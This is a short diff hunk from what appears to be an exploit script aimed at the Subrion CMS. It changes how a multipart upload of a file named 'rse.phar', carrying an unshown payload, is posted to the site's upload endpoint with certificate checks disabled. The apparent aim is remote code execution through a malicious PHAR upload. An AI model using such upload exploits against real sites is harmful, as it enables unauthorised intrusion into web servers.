@@ -59,7 +59,7 @@ class Subrion:
             "target":"l1_Lw"
         }
         file_content = {
-            'upload[]':('rse.phar',payload,{'Content-Type':'application/octet-stream'},{'Content-Disposition':'form-data'}),
+            'upload[]':('rse.phar',payload,'application/octet-stream',{'Content-Disposition':'form-data'}),
         }
 
         self.session.post(upload_url,data=file_data,files=file_content, verify=False)
